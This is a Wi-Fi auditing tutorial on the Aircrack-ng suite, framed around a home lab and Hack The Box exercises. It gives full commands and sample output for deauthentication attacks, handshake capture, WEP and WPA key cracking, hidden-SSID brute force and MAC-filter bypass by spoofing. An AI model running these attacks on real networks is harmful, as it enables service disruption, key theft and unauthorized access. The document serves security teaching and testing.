Aircrack-ng is a wireless network auditing suite that includes multiple specialized tools. Its versatility and power allow for comprehensive security testing on your own Wi-Fi infrastructure.

To master **Aircrack-ng**, the ideal approach is to understand that it is not a single program, but a "Swiss army knife" where each tool has a specific role in the auditing cycle.

### 1. Airmon-ng: Monitor Mode Management

**Airmon-ng** is an essential utility of the Aircrack-ng suite, designed to enable **monitor mode** on wireless network interfaces. Its main function is to allow the network card to capture all Wi-Fi traffic within its range.

Unlike **managed mode** (where the interface only processes frames directed specifically to its MAC address), monitor mode disables hardware filters. This allows every detected data packet in the air to be intercepted, regardless of its original destination.

##### Enabling Monitor Mode

We can use `airmon-ng` to list available interfaces and activate monitor mode. To enable it on a specific interface (for example, an external adapter `wlan1`):

```bash
sudo airmon-ng start wlan1
```

<img src="/budahacksecurity/uploads/md_images/air/air.png" style="max-width:100%; border-radius:8px;">

**Verification:** To confirm the change, use the `iwconfig` utility. You will notice that the _Mode_ field will show _Monitor_:

```bash
iwconfig wlan1
```

<img src="/budahacksecurity/uploads/md_images/air/air2.png" style="max-width:100%; border-radius:8px;">

##### Managing Interference Processes

When activating monitor mode, some system processes (such as NetworkManager or wpa_supplicant) may interfere, attempting to regain control of the card or automatically changing the channel.

- **Check processes:** `sudo airmon-ng check`
- **Kill conflicting processes:** If you experience instability, use the following command to "clean" the environment:

```bash
sudo airmon-ng check kill
```

#### Monitor Mode on Specific Channels

If you already know the target, you can configure the card to listen only on a specific channel. This is more efficient than multi-channel scanning:

```
sudo airmon-ng start wlan1 6

PHY     Interface   Driver      Chipset

phy2    wlan1       rtl8xxxu    Realtek Semiconductor Corp. RTL8188EUS 802.11n Wireless Network Adapter
    (mac80211 monitor mode already enabled for [phy2]wlan1 on [phy2]6)
```

##### Disabling Monitor Mode

To return the card to its normal state (managed mode), simply stop the service on the virtual interface:

```bash
sudo airmon-ng stop wlan1
```

Finally, verify with `iwconfig` that the name has returned to normal and the mode is once again _Managed_.

<img src="/budahacksecurity/uploads/md_images/air/air3.png" style="max-width:100%; border-radius:8px;">


### 2. Airodump-ng: Packet Capture and Network Scanning

**Airodump-ng** is a tool specialized in capturing raw **802.11** frames. Its main function is the collection of Initialization Vectors (IVs) on WEP networks and, more commonly, the capture of the **4-way Handshake** on WPA/WPA2/WPA3 networks.

In addition to capture, it generates log files (such as `.cap`, `.csv`, and `.kismet`) containing detailed information about Access Points (APs) and connected clients, facilitating subsequent analysis or the use of custom scripts.

##### Information Provided During Scanning

When running `airodump-ng`, the interface is divided into two sections: the upper part displays **Access Points** and the lower part displays **Clients (Stations)**.

##### Access Point (AP) Fields:

- **BSSID:** Physical MAC address of the access point.
- **PWR (Power):** Received signal level. The closer to 0, the stronger the signal (e.g., -30 is excellent, -80 is weak).
- **Beacons:** Number of announcement packets sent by the AP to advertise its existence.
- **#Data:** Number of captured data packets (useful for detecting real activity on the network).
- **#/s:** Number of data packets captured per second over the last 10 seconds.
- **CH (Channel):** Channel on which the network operates.
- **MB (Max Bandwidth):** Maximum speed supported by the AP.
- **ENC (Encryption):** Encryption algorithm used (WPA2, WPA3, OPN, WEP).
- **CIPHER:** Detected cipher (CCMP, TKIP, etc.).
- **AUTH:** Authentication type (PSK, MGT, SAE).
- **ESSID:** The name of the Wi-Fi network.

##### Client (STATIONS) Fields:

- **STATION:** MAC address of the connected client device.
- **RATE:** Data transfer rate between the client and the AP.
- **LOST:** Number of packets lost due to interference or poor signal.
- **Packets:** Total packets sent by the client.
- **Notes:** Additional relevant information, such as detection of **EAPOL** (Handshake) or **PMKID** captures.
- **PROBES:** Networks the client is actively searching for or has previously connected to.

##### Running Airodump-ng

To use **airodump-ng**, monitor mode must be active on our wireless network interface:

```
sudo airmon-ng start wlan1
```

Once enabled, run the general scan to identify targets:

```
sudo airodump-ng wlan1mon
```

**Output:**

```
 CH  9 ][ Elapsed: 12 s ][ 2026-05-01 15:30

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 AA:BB:CC:11:22:33  -42       54      102    5   6  54e  WPA2 CCMP   PSK  ByteZero_Lab
 DE:AD:BE:EF:00:01  -65       22        0    0  11  54   WPA2 CCMP   PSK  Guest_Network

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes

 AA:BB:CC:11:22:33  00:11:22:33:44:55  -38   54-54      0      254   EAPOL  ByteZero_Lab
```

Looking at the output above, we can see there are 2 available access points (APs): **ByteZero_Lab** and **Guest_Network**, both using **WPA2 CCMP** encryption.

In the stations section, we see that the client with MAC `00:11:22:33:44:55` is connected to network `AA:BB:CC:11:22:33` (ByteZero_Lab). The **EAPOL** note indicates that the key exchange necessary for a subsequent cracking attempt has been detected.

##### Scanning Specific Channels

To focus on a single channel and prevent the card from "hopping" between frequencies (losing packets), use the `-c` flag:

```
sudo airodump-ng -c 11 wlan1mon
```

**Output:**

```
 CH 11 ][ Elapsed: 4 s ][ 2026-05-01 15:35

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 DE:AD:BE:EF:00:01  -50       15       12    2  11  54   WPA2 CCMP   PSK  Guest_Network
```

You can also specify multiple channels separated by commas:

```
sudo airodump-ng -c 1,6,11 wlan1mon
```

##### Scanning on 5 GHz Bands

By default, airodump-ng scans the **2.4 GHz** band. If your adapter supports **5 GHz**, you can specify it with the `--band` parameter:

- **a:** 5 GHz frequency.
- **b/g:** 2.4 GHz frequency.

```
sudo airodump-ng wlan1mon --band a
```

**Example output (5 GHz Band):**

```
 CH 149 ][ Elapsed: 8 s ][ 2026-05-01 15:40

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID

 FE:ED:CB:A9:87:65  -35       80      450   20 149  270  WPA3 AES    SAE  HighSpeed_5G
```

##### Saving Output to a File

To perform subsequent analysis or use `aircrack-ng`, it is essential to save the capture to disk using the `-w` (write) parameter:

```
sudo airodump-ng -c 6 --bssid AA:BB:CC:11:22:33 -w captura_ByteZero wlan1mon
```

**Result:** This command will create several files in your current directory:

1. `captura_ByteZero-01.cap` — Contains the captured packets (the most important file).
2. `captura_ByteZero-01.csv` — Network data in text format.
3. `captura_ByteZero-01.kismet.netxml` — For tools compatible with Kismet.


### 3. Airgraph-ng: Wireless Intelligence Visualization

Imagine that `airodump-ng` filled your screen with rows and columns of MACs, channels, and encryption types. That is useful, but difficult to read at a glance. Airgraph-ng is a tool that takes exactly that CSV file generated by `airodump-ng` (using its `-w` option) and converts it into a visual graph showing the relationships between clients and access points. In the ByteZero lab, this allows us to map the attack surface in seconds instead of manually parsing lines of text.

**It supports exactly two types of graphs:**

##### Client-to-AP Relationship Graph (CAPR)

**What does it show?** A visual map of which devices (clients) are connected to which access points (APs) at the time of capture.

This graph is client-centered, so you will not see any AP that has no devices connected to it. That is, if a router is powered on but no one is connected to it at that moment, it simply will not appear. This is normal and expected.

**AP color coding** — verified directly from the source code and official documentation:

|Color|Encryption Type|
|---|---|
|Green|WPA (WPA/WPA2/WPA3)|
|Yellow|WEP|
|Red|Open network (no encryption)|
|Black|Unknown encryption|

Our target `ByteZero_Lab`, using WPA2, will appear in **green**.

```bash
sudo airgraph-ng -i captura_ByteZero-01.csv -g CAPR -o ByteZero_CAPR.png
```

Command breakdown:

- `-i captura_ByteZero-01.csv` → input file (airodump-ng CSV, **not** the .pcap)
- `-g CAPR` → graph type: client–AP relationship
- `-o ByteZero_CAPR.png` → output image in PNG format

When running it, you will see this warning on screen: `**** WARNING Images can be large, up to 12 Feet by 12 Feet****`. This is normal; processing time depends on the amount of captured data.

<img src="/budahacksecurity/uploads/md_images/air/air4.png" style="max-width:100%; border-radius:8px;">

##### Common Probe Graph (CPG)

**What does it show?** Probe requests — signals that devices constantly emit while searching for known networks, even when not connected to any.

The CPG shows the names of networks that nearby Wi-Fi devices are actively searching for. This can reveal a list of networks a client typically connects to, even if they are not currently present in the environment.

From a security analysis perspective, this is very valuable: if a device (for example, MAC `00:11:22:33:44:55`) is sending probes searching for the network `HomeOfJohn`, we know that device frequents that network outside our environment, giving us information about the user's connectivity habits.

```bash
sudo airgraph-ng -i captura_ByteZero-01.csv -g CPG -o ByteZero_CPG.png
```

The only difference from the previous command is `-g CPG` instead of `-g CAPR`. The remaining parameters work the same way.

<img src="/budahacksecurity/uploads/md_images/air/air5.png" style="max-width:100%; border-radius:8px;">

#### Complete Workflow

To clarify how airgraph-ng fits into the process:

```
airmon-ng → monitor mode
      ↓
airodump-ng → captures and generates captura_ByteZero-01.csv
      ↓
airgraph-ng → converts CSV into PNG graph
      ↓
Visual analysis → identification of nodes, relationships, and vulnerabilities
```

By converting captured data into graphical format, a clearer understanding of the network structure is obtained, making it easier to plan more targeted and effective security assessments.


### 4. Aireplay-ng: Traffic Generator and Packet Injection

**Aireplay-ng** is the Aircrack-ng suite tool responsible for injecting and replaying frames on wireless networks. Its main function is to artificially generate traffic to facilitate the capture of Initialization Vectors (IVs) needed to break WEP, or to force the generation of a **WPA 4-way handshake** through deauthentication attacks. It can also obtain packets from two sources: directly from the wireless card in real time, or by reading them from a previously captured `.pcap` file.

##### Packet Injection Test

Before launching any attack, it is essential to verify that your wireless adapter is capable of injecting traffic correctly. If the adapter is on a different channel than the target AP, the command will produce no output and appear to hang — make sure you are on the correct channel first.

Synchronize the interface to the target's channel (channel 6 for our lab):

```bash
# Option 1: restart airmon-ng pointing to the channel
sudo airmon-ng stop wlan1mon
sudo airmon-ng start wlan1 6

# Option 2: use iw for greater precision without restarting
sudo iw dev wlan1mon set channel 6
```

> **Note:** The `stop` command before `start` is recommended to avoid creating multiple virtual interfaces (VAPs), which can cause driver conflicts.

Run the injection test:

```bash
sudo aireplay-ng --test wlan1mon
```

> If the output shows **Injection is working!**, your card can successfully send frames. If the test fails with a specific AP, try another from the list — not all APs respond to the test in the same way.

##### Deauthentication Attack (Attack -0)

The deauthentication attack exploits a fundamental weakness of the 802.11 standard: deauthentication frames **are not cryptographically authenticated**, so any device can send them while impersonating another. The attack operates in two simultaneous directions: it sends packets to the AP impersonating the client, and packets to the client impersonating the AP. Both ends terminate the session believing the other initiated it. As soon as the client attempts to automatically reconnect, we capture the **4-way handshake**.

#### ByteZero Lab Scenario

- **BSSID (AP):** `AA:BB:CC:11:22:33` (ByteZero_Lab)
- **STATION (client):** `00:11:22:33:44:55`
- **Channel:** 6

##### Executing the Attack

While keeping `airodump-ng` running in one terminal to capture traffic, open a second terminal and launch:

```bash
sudo aireplay-ng -0 5 -a AA:BB:CC:11:22:33 -c 00:11:22:33:44:55 wlan1mon
```

**Command breakdown:**

- **`-0 5`:** Deauthentication attack sending 5 bursts of packets (0 = continuous).
- **`-a AA:BB:CC:11:22:33`:** MAC address of the target AP (ByteZero_Lab).
- **`-c 00:11:22:33:44:55`:** MAC address of the specific client. If omitted, all connected clients are deauthenticated.
- **`wlan1mon`:** Your interface in monitor mode.

> **Tip:** Whenever possible, specify the client MAC with `-c`. Deauthenticating all clients indiscriminately generates unnecessary noise and can disrupt services on a production network.

##### Capturing the Handshake

Once the attack is executed, you will observe in the `airodump-ng` screen how the client's _Lost packets_ increase, signaling the disconnection. Immediately after, the client reconnects and the confirmation appears in the upper right corner:

```
 CH  6 ][ Elapsed: 1 min ][ 2026-05-01 17:00 ][ WPA handshake: AA:BB:CC:11:22:33

 BSSID              PWR  Beacons    #Data  #/s  CH   MB   ENC   CIPHER  AUTH  ESSID

 AA:BB:CC:11:22:33  -40       85      650   15   6  54e  WPA2  CCMP    PSK   ByteZero_Lab
```

The message **WPA handshake: AA:BB:CC:11:22:33** in the upper right corner confirms that the `.cap` file contains the data needed for the cracking phase with `aircrack-ng`.

##### Available Attacks in aireplay-ng

|Attack|Name|Protocol|Technical Description|
|---|---|---|---|
|`-0`|Deauthentication|WPA/WPA2|Sends deauthentication frames impersonating both endpoints (AP and client) to force reconnection and capture the 4-way handshake.|
|`-1`|Fake Authentication|WEP|Associates the attacker's MAC with the AP without being a real client. Does not generate ARP packets and **does not work with WPA/WPA2**. Useful when no legitimate clients are associated.|
|`-2`|Interactive Packet Replay|WEP|Allows manual selection of a specific packet (from the card or from a `.pcap` file) and reinjects it to generate additional IVs.|
|`-3`|ARP Request Replay|WEP|Captures ARP requests and continuously reinjects them against the AP, generating a flood of IVs that accelerates WEP cracking.|
|`-4`|KoreK ChopChop|WEP|Decrypts a WEP packet without knowing the key, revealing the plaintext. Does not recover the key itself. Some APs are not vulnerable.|
|`-5`|Fragmentation|WEP|Obtains up to 1500 bytes of PRGA (Pseudo-Random Generation Algorithm). The PRGA is used with `packetforge-ng` to forge packets and inject them to generate IVs.|
|`-6`|Caffe Latte|WEP|Attacks the client instead of the AP — allows recovering the WEP key **without the AP in range**. Captures an ARP from the client, manipulates it, and resends it to provoke encrypted traffic from which IVs are extracted.|
|`-7`|Client-Oriented Fragmentation|WEP|Variant of the fragmentation attack directed at clients. Especially effective on ad-hoc networks and against softAP clients.|
|`-8`|WPA Migration Mode|WEP + WPA|Specific to Cisco Aironet APs in migration mode, which allow coexistence of WPA and WEP clients under the same SSID. Not a generic attack against WPA.|
|`-9`|Injection Test|N/A|Verifies if the adapter can inject packets. Should be run before any attack to confirm hardware compatibility.|


### 5. Airdecap-ng: Traffic Decryption and Data Analysis

Once the network key (WEP or WPA/WPA2) has been obtained, the next logical step in an audit is to analyze the captured traffic to identify protocols, credentials, or sensitive data. **Airdecap-ng** allows decryption of `.cap` or `.pcap` files, removing the encryption layers and 802.11 wireless headers so the content is readable in tools like Wireshark.

**What is Airdecap-ng used for?**

- **Open capture cleanup:** Removes 802.11 headers from unencrypted networks, converting the capture into a standard analyzable Ethernet frame.
- **WEP decryption:** Uses the hexadecimal key obtained with aircrack-ng to release the encrypted traffic.
- **WPA/WPA2 decryption:** Uses the passphrase and ESSID to decrypt the packets. Requires having previously captured the 4-way handshake.

**Main Options**

|Option|Description|
|---|---|
|`-b`|Filters by the MAC address (BSSID) of the access point.|
|`-e`|Target network name (ESSID).|
|`-p`|WPA/WPA2 passphrase.|
|`-w`|Hexadecimal key for WEP networks.|

When processing a file with Airdecap-ng, a new file is automatically generated with the `-dec.cap` suffix. For example:

```
captura_ByteZero-01.cap  →  captura_ByteZero-01-dec.cap
```

##### 1. WPA2 Network Decryption

Using the passphrase obtained in the cracking phase (`ByteZero@2026`), we proceed to decrypt the capture:

```bash
sudo airdecap-ng -p 'ByteZero@2026' -e "ByteZero_Lab" captura_ByteZero-01.cap
```

Output:

```
Total number of stations seen            1
Total number of packets read           500
Total number of WPA data packets       150
Number of decrypted WPA  packets       150
```

> **Important:** If the number of decrypted packets is 0, it means the handshake was not complete in the capture file or the passphrase is incorrect.

##### 2. Analysis: Before vs. After in Wireshark

It is essential to understand the visual difference between both files when analyzing them:

- **Original encrypted file:** Wireshark identifies the protocol simply as `802.11`. No IP addresses can be seen, only MACs, and the data content is completely unreadable.
- **Decrypted file (`-dec.cap`):** Wireshark displays the real protocols: `TCP`, `HTTP`, `DNS`, `ARP`, etc. Source and destination IP addresses are visible, allowing real forensic analysis of the network traffic.

##### 3. Open Network Cleanup

If you are auditing a network without a password, you can remove the wireless headers to obtain a capture equivalent to a standard Ethernet network, simplifying subsequent analysis in Wireshark:

```bash
sudo airdecap-ng -b AA:BB:CC:11:22:33 captura_abierta.cap
```

> **Note:** No passphrase or key is specified for open networks. The tool only strips the 802.11 headers, leaving the traffic in clear text ready for inspection.

### 6. Aircrack-ng: The Decryption Engine

**Aircrack-ng** is the central tool of the suite for wireless network key recovery. It is capable of attacking WEP networks through statistical analysis of Initialization Vectors (IVs), and WPA/WPA2-PSK networks through dictionary attacks. Operating completely **offline**, it works on already-captured packets without requiring direct interaction with the target during the process — making it undetectable to the AP once the capture is complete.

##### System Benchmark

Before launching any dictionary attack, it is worth evaluating your CPU performance to estimate the real process times.

```bash
aircrack-ng -S
```

If the system returns, for example, `1,628,101 k/s`, your CPU can test approximately **1.6 million passphrases per second**. Keep in mind that this speed drops noticeably if the system is under load from other simultaneous tasks.

> **Note:** Aircrack-ng uses only the CPU. If you want to accelerate dictionary attacks using the GPU, tools like `hashcat` are considerably more efficient for that purpose.

##### WEP Network Cracking

Aircrack-ng recovers the WEP key through statistical analysis once enough IVs have been accumulated in the capture. The `-K` option invokes the **PTW** method combined with the KoreK algorithm, which is the current standard method.

```bash
aircrack-ng -K captura_ByteZero_WEP.ivs
```

```
                        Aircrack-ng 1.7

        [00:00:14] Tested 12850 keys (got 250432 IVs)

   KB    depth   byte(vote)
    0    0/  1   AA(  62) 12(  21) 7F(  18) 0C(  15) 1A(  12)
    1    0/  2   BB(  45) DE(  20) F1(  17) E2(  15) 32(  12)
    2    0/  1   CC(  88) 74(  22) 51(  15) 1B(  13) 73(  11)
    3    0/  1   11( 152) EC(  22) EB(  16) FB(  13) 81(  12)
    4    0/  1   22( 141) 90(  30) 4A(  15) 8F(  14) E9(  13)
    5    0/  1   33(  75) 04(  25) 60(  22) C8(  21) 26(  19)

                 KEY FOUND! [ AA:BB:CC:11:22:33 ]

    Decrypted correctly: 100%
```

As a general reference, between **20,000 and 40,000 IVs** are needed for 64-bit WEP, and between **40,000 and 85,000** for 128-bit WEP, although the PTW method can achieve it with fewer. If there are enough IVs, the tool will display `KEY FOUND!` with the key in hexadecimal format.

##### WPA/WPA2 Network Cracking

To attack WPA/WPA2-PSK, the **4-way handshake** previously captured with airodump-ng is required. The process is a pure dictionary attack: aircrack-ng takes each entry from the wordlist, derives the PMK key using the ESSID, and checks if it matches the handshake data.

> **Important:** Aircrack-ng can operate with a partial handshake (EAPOL packets 2+3 or 3+4), although a complete 4-packet handshake guarantees greater reliability in the process.

- Capture file: `captura_ByteZero-01.cap`
- Dictionary: `/usr/share/wordlists/passwords.txt`

```bash
aircrack-ng captura_ByteZero-01.cap -w /home/bda/Desktop/passwords.txt
```

You can also specify the BSSID directly to prevent aircrack-ng from asking you to manually select the network when there are multiple handshakes in the file:

```bash
aircrack-ng captura_ByteZero-01.cap -w /usr/share/wordlists/passwords.txt -b AA:BB:CC:11:22:33
```

**Expected output when the key is found:**

```
                      Aircrack-ng 1.7

      [00:00:10] 5000/14344392 keys tested (1500.20 k/s)

   Master Key  : B1 22 FC D0 EA AA BB C9 A9 F5 86 44 FF 35 E1 10
                 2A 01 D9 C1 0B A5 E0 2E FD F8 CB 5D 73 0C E7 BC

              KEY FOUND! [ ByteZero@2026 ]
```


### 7. Finding Hidden SSIDs

> The following exercises were performed in a controlled lab environment provided by Hack The Box (HTB). All targets and networks used are part of HTB's official platform and are intended exclusively for ethical hacking practice.

In Wi-Fi networks, the Service Set Identifier (`SSID`) is the name that identifies a particular wireless network. Most networks broadcast their SSID to facilitate device connections; however, some networks choose to hide it as a security measure. This does not mean it is impossible to discover — hiding the SSID is only a superficial layer of protection.

Below we will see how to find those hidden SSIDs using the tools of the **Aircrack-ng** suite.



###### Scanning

We start by configuring our interface in monitor mode:

```bash
sudo airmon-ng start wlan1
```

Next we launch `airodump-ng` to search for available Wi-Fi networks:

```bash
sudo airodump-ng wlan1mon
```


<img src="/budahacksecurity/uploads/md_images/air/air6.png" style="max-width:100%; border-radius:8px;">

In the output we observe the notation **`<length: x>`**, which indicates the length of the Wi-Fi network name, where `x` represents the number of characters of the hidden SSID.

There are several ways to discover the hidden SSID. If there are clients connected to the network, we can use **aireplay-ng** to send deauthentication requests to the client. When the client reconnects to the AP, **airodump-ng** will capture the reassociation request and reveal the SSID.

> **Important:** Deauthentication attacks **do not work on WPA3 networks**, since this protocol implements **802.11w** (Protected Management Frames, PMF), which cryptographically authenticates management frames, including deauthentication ones. In those cases, we can resort to a brute-force attack to determine the SSID name.

###### Discovering Hidden SSID with Deauth

Using the previous `airodump-ng` output, we identify a client with station ID `02:00:00:00:02:00` connected to BSSID `D8:D6:3D:EB:29:D5`. We use **aireplay-ng** to send deauthentication requests to that client, forcing its reconnection and capturing the SSID in the process:

```bash
sudo aireplay-ng -0 10 -a D8:D6:3D:E8:29:D5 -c 02:00:00:00:02:00 wlan0mon
```

Once the client reconnects, `airodump-ng` displays the SSID that previously appeared hidden.

###### Discovering Hidden SSID by Brute Force with mdk3

Another way to discover a hidden SSID is through a brute-force attack with the `mdk3` tool. Its basic syntax is:

```bash
mdk3 <interface> <test_mode> [test_options]
```

The `p` argument activates the **basic probe and ESSID bruteforce mode**. The available options for this mode are:

|**Option**|**Description**|
|---|---|
|`-e`|Specifies a specific SSID to probe.|
|`-f`|Reads candidate SSIDs from a file (wordlist).|
|`-t`|Defines the MAC address of the target AP.|
|`-s`|Sets the test speed (default: unlimited; in bruteforce: 300).|
|`-b`|Activates full brute-force mode with the specified charset. Recommended only for short SSIDs.|

**Available charsets for `-b`:**

- `u` — Uppercase only
- `n` — Digits only
- `a` — All printable characters
- `c` — Uppercase and lowercase
- `m` — Uppercase, lowercase, and numbers

**Brute force with all possible values:**

```bash
sudo mdk3 wlan0mon p -b u -c 1 -t A2:A6:32:1B:29:D5
```

<img src="/budahacksecurity/uploads/md_images/air/air7.png" style="max-width:100%; border-radius:8px;">

**Brute force using a wordlist:**

```bash
sudo mdk3 wlan0mon p -f /opt/wordlist.txt -t D2:A3:32:1B:29:D5
```

<img src="/budahacksecurity/uploads/md_images/air/air8.png" style="max-width:100%; border-radius:8px;">


### 8. Bypassing MAC Filtering

> The following exercises were performed in a controlled lab environment provided by Hack The Box (HTB). All targets and networks used are part of HTB's official platform and are intended exclusively for ethical hacking practice.

MAC filtering is a security measure implemented on wireless routers to restrict network access exclusively to devices whose MAC addresses are on an allowed list. Obtaining the network password is an important step, but if the router has this filtering active, we will not be able to connect even with the correct key — we will need to spoof an authorized MAC address.

We start by scanning the available Wi-Fi networks:

```bash
sudo airodump-ng wlan0mon
```

> Remember that the network adapter must be in monitor mode before running this command.

<img src="/budahacksecurity/uploads/md_images/air/air9.png" style="max-width:100%; border-radius:8px;">

We can see that the `ESSID` is available and has several connected clients. Once the password is obtained, when we try to connect the router rejects us because our MAC is not on its access list.

To bypass MAC filtering we can spoof the MAC address of an authorized client. However, this can generate **MAC collisions** — two devices cannot coexist with the same MAC address on the same network simultaneously.

To resolve this we have several options:

- Disconnect the legitimate client through a deauthentication attack, thereby freeing its MAC address.
- Wait for the client to disconnect on its own.
- Check if there is a **5 GHz** band available without connected clients and connect to it directly.

###### Scanning Networks on the 5 GHz Band

```bash
sudo airodump-ng wlan0mon -b a
```

<img src="/budahacksecurity/uploads/md_images/air/air10.png" style="max-width:100%; border-radius:8px;">

We confirm that a 5 GHz band network exists with no clients connected, allowing us to spoof a MAC from the 2.4 GHz band without risk of collision.

We use the [macchanger](https://github.com/alobbs/macchanger) tool to spoof our MAC address:

**1. Stop monitor mode:**

```bash
sudo airmon-ng stop wlan0mon
```

**2. Check our current MAC address:**

```bash
sudo macchanger wlan0
```

```
Current MAC:   42:00:00:00:05:00 (unknown)
Permanent MAC: 42:00:00:00:05:00 (unknown)
```

**3. Disable the interface:**

```bash
sudo ifconfig wlan0 down
```

**4. Change the MAC address to that of an authorized client:**

```bash
sudo macchanger wlan0 -m 72:B4:31:0D:1A:C8
```

```
Current MAC:   42:00:00:00:05:00 (unknown)
Permanent MAC: 42:00:00:00:05:00 (unknown)
New MAC:       72:b4:31:0d:1a:c8 (unknown)
```

**5. Re-enable the interface:**

```bash
sudo ifconfig wlan0 up
```

```
wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 72:b4:31:0d:1a:c8  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

We connect to the 5 GHz band network and gain access:

```
wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.2.27  netmask 255.255.255.0  broadcast 192.168.2.255
        inet6 fe80::6260:9a2e:9d7f:1983  prefixlen 64  scopeid 0x20<link>
        ether 72:b4:31:0d:1a:c8  txqueuelen 1000  (Ethernet)
        RX packets 10  bytes 1541 (1.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 32  bytes 5129 (5.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

The assigned IP address `192.168.2.27` confirms that the router accepted us with the spoofed MAC and granted us access to the network.
